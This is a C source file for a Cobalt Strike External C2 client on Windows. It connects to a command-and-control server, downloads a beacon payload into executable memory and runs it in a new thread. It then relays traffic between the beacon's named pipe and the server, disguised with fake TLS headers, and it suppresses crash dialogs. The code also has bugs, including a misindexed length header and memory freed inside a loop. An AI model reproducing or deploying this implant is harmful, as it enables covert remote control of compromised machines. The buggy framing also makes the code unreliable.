/**
 * client.c
 * by Daniel Fitzgerald
 * Jan 2020
 *
 * Program to provide TCP communications for Cobalt Strike using the External C2 feature.
 */

#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment (lib, "Ws2_32.lib")

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h> 
#include <stdlib.h>
#include <time.h>

#define MAX 4096
// Mudge used these values in his example
#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024

#define SA struct sockaddr


/**
 * Creates a socket connection in Windows
 *
 * @param ip A pointer to a string containing the IP address to connect to
 * @param port A pointer to a string containing the port to connect on
 * @return A socket handle for the connection
 * @pre ip and port form a valid IP address and port number
*/
SOCKET create_socket(char* ip, char* port)
{
	int iResult;
	SOCKET ConnectSocket = INVALID_SOCKET;
	WSADATA wsaData;
	struct addrinfo* result = NULL, * ptr = NULL, hints;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return INVALID_SOCKET;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(ip, port, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Attempt to connect to the first address returned by the call to getaddrinfo
	ptr = result;

	// Create a SOCKET for connecting to server
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
	if (ConnectSocket == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Connect to server.
	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	// free the resources returned by getaddrinfo and print an error message
	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return INVALID_SOCKET;
	}
	return ConnectSocket;
}



// /**
//  *  This function pulls the data out of the TLS packet. 
//  *  @param packet: the TLS packet to remove the string from.
//  *  @param payload: the buffer to write the string to. 
//  *  @return the length of payload_out
//  *  @pre len(payload) = len(packet) - 5
//  *  @post application data from packet buffer gets written to payload buffer. 
//  *  
//  */ 
// unsigned short decode_position(char* packet_in, char* payload_out ) {
	
// 	unsigned short length = (unsigned short) ((256 * packet_in[3]) + packet_in[4]);
// 	char* start = &(packet_in[5]);
// 	memcpy(payload_out, start, length);
// 	return length;
// }


/**
 *  This function encodes a byte into a string of appropriate length.
 *  @param payload_in: the bytes to send. 
 *  @param payload_str: pointer to a buffer to write the TLS packet into.
 *  @param length: length of payload_in data. 
 *  @pre len(payload_in) = len(payload_out) - 7
 *  @post first three bytes of payload_out match TLS 1.0, bytes 4 and 5 are the length, and 
 *   	  the rest contains the contents of payload_in.
 */ 
void encode_position(char* packet_out, DWORD length) {
	packet_out[0] = 0x17;
	packet_out[1] = 0x03;
	packet_out[2] = 0x01;
	packet_out[4] = (unsigned char)(length / 16777216) % 256;
	packet_out[5] = (unsigned char)(length / 65536) % 256;
	packet_out[5] = (unsigned char)(length / 256) % 256;
	packet_out[6] = (unsigned char)length % 256;
}

/**
 *  This function generates an empty end transmission payload.
 *  @param packet_out: pointer to a buffer to write the payload string into.
 *  @pre len(packet_out) == 5.
 *  @post packet_out represents a TLSv1.1 packet with length 0. 
 */ 
void encode_end_transmission(char* packet_out) {
	packet_out[0] = 0x17;
	packet_out[1] = 0x03;
	packet_out[2] = 0x02;
	packet_out[3] = 0;
	packet_out[4] = 0;
}


/**
 * Sends data to server received from our injected beacon
 *
 * @param sd A socket file descriptor
 * @param data A pointer to an array containing data to send
 * @param len Length of data to send
*/
void sendData(SOCKET sd, char* data, DWORD len) {
	
	char* header = malloc(7);
	encode_position(header, len);
	send(sd, header, 7, 0);
	send(sd, data, len, 0);
	free(header);
}


/**
 * Receives data from our C2 controller to be relayed to the injected beacon
 *
 * @param sd The socket file descriptor
 * @param buffer Buffer to store data in
 * @param max full size of allocated buffer
 * @return Size of data recieved
 * @pre buffer points to an allocated memory region of size max
 * @post buffer contains the data recieved from the team server
*/
DWORD recvData(SOCKET sd, char * buffer, DWORD max) {
	
	char* total_print = malloc(30);
	DWORD length = 0, total = 0, temp = 0;
	char* header = malloc(3);
	recv(sd, header, 3, 0);
	system("echo receive-header >> channel_out.txt");
	
	recv(sd, (char*)&length, 4, 0);
	system("echo read-length >> channel_out.txt");

	while (total < length) {
		temp = recv(sd, buffer + total, length - total, 0) + 1;
		if (temp > 0) {
			sprintf(total_print, "echo %u >> channel_out.txt", total);
			system(total_print);
			total = total + temp;
		} else {
			sprintf(total_print, "echo %u >> channel_out.txt", total);
			system(total_print);
			total = total + 1;
		}
		system("echo receive payload >> channel_out.txt");

		sprintf(total_print, "echo %u >> channel_out.txt", total);
		system(total_print);
		free(total_print);
	}
	

	free(header);


	return total;
}


/**
 * Reads a frame from the SMB pipe
 * 
 * @param smb_handle Handle to beacons SMB pipe
 * @param buffer buffer to read data into
 * @param max unused
 * @return size of data read
 */
DWORD read_frame(HANDLE smb_handle, char * buffer, DWORD max) {
	DWORD size = 0, temp = 0, total = 0;
	/* read the 4-byte length */
	ReadFile(smb_handle, (char *)&size, 4, &temp, NULL);

	/* read the whole thing in */
	while (total < size) {
		ReadFile(smb_handle, buffer + total, size - total, &temp, NULL);
		total += temp;
	}

	return size;
}


/**
 * Writes a frame to the SMB pipe
 * 
 * @param smb_handle Handle to beacons SMB pipe
 * @param buffer buffer containing data to send
 * @param length length of data to send
 */
void write_frame(HANDLE smb_handle, char * buffer, DWORD length) {
	DWORD wrote = 0;
	WriteFile(smb_handle, (void *)&length, 4, &wrote, NULL);
	WriteFile(smb_handle, buffer, length, &wrote, NULL);
}







/**
 * Main function. Connects to IRC server over TCP, gets beacon and spawns it, then enters send/recv loop
 *
 */
void main(int argc, char* argv[])
{

	printf("Function start");
	// Set connection and IRC info
	if (argc != 4)
	{
		printf("Incorrect number of args: %d\n", argc);
		printf("Incorrect number of args: client.exe [IP] [PORT] [PIPE_STR]");
		exit(1);
	}

	// Disable crash messages
	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
	// _set_abort_behavior(0,_WRITE_ABORT_MSG);

	char* IP = argv[1];
	char* PORT = argv[2];
	
	char pipe_str[50];
	strcpy(pipe_str, argv[3]);

	DWORD payloadLen = 0;
	char* payloadData = NULL;
	HANDLE beaconPipe = INVALID_HANDLE_VALUE;

	// Create a connection back to our C2 controller
	SOCKET sockfd = INVALID_SOCKET;

	sockfd = create_socket(IP, PORT);
	if (sockfd == INVALID_SOCKET)
	{
		printf("Socket creation error!\n");
		exit(1);
	}

	// Recv beacon payload
	char * payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (payload == NULL)
	{
		printf("payload buffer malloc failed!\n");
		exit(1);
	}
	DWORD payload_size = recvData(sockfd, payload, BUFFER_MAX_SIZE);
	if (payload_size < 0)
	{
		printf("recvData error, exiting\n");
		free(payload);
		exit(1);
	}
	printf("Recv %d byte payload from TS\n", payload_size);
	/* inject the payload stage into the current process */
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);
	// Loop unstil the pipe is up and ready to use
	while (beaconPipe == INVALID_HANDLE_VALUE) {
		// Create our IPC pipe for talking to the C2 beacon
		Sleep(500);
		// 50 (max size of PIPE_STR) + 13 (size of "\\\\.\\pipe\\")
		char pipestr[50+13]= "\\\\.\\pipe\\";
		// Pipe str (i.e. "mIRC")
		strcat(pipestr, pipe_str);
		// Full string (i.e. "\\\\.\\pipe\\mIRC")
		beaconPipe = CreateFileA(pipestr, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, (DWORD)NULL, NULL);
	}
	printf("Connected to pipe!!\n");

	// Mudge used 1MB max in his example, test this
	char * buffer = (char *)malloc(BUFFER_MAX_SIZE);
	if (buffer == NULL)
	{
		printf("buffer malloc failed!\n");
		free(payload);
		exit(1);
	}

	while (1) {
		// Start the pipe dance
		DWORD read_size = read_frame(beaconPipe, buffer, BUFFER_MAX_SIZE);
		if (read_size < 0)
		{
			printf("read_frame error, exiting\n");
			break;
		}
		printf("Recv %d bytes from beacon\n", read_size);
		

		sendData(sockfd, buffer, read_size);
		printf("Sent to TS\n");
		
		read_size = recvData(sockfd, buffer, BUFFER_MAX_SIZE);
		if (read_size < 0)
		{
			printf("recvData error, exiting\n");
			break;
		}
		printf("Recv %d bytes from TS\n", read_size);

		write_frame(beaconPipe, buffer, read_size);
		printf("Sent to beacon\n");
	}
	free(payload);
	free(buffer);
	closesocket(sockfd);
	CloseHandle(beaconPipe);

	exit(0);


}

